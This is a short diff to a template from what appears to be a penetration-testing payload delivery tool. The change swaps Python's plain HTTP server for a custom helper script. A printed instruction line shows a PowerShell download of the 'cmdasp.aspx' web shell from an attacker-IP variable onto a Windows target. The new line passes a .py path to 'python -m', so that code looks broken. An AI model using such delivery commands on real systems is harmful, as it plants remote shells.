@@ -11,4 +11,4 @@ content: |
     echo '                      -----PowerShell-----                      '; \
     echo 'Deliver only: iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/cmdasp.aspx -Outfile <%=$(esh variables/delivery_path_windows)%>\cmdasp.aspx'; \
     echo '================================================================'; \
-    python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+    python -m <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
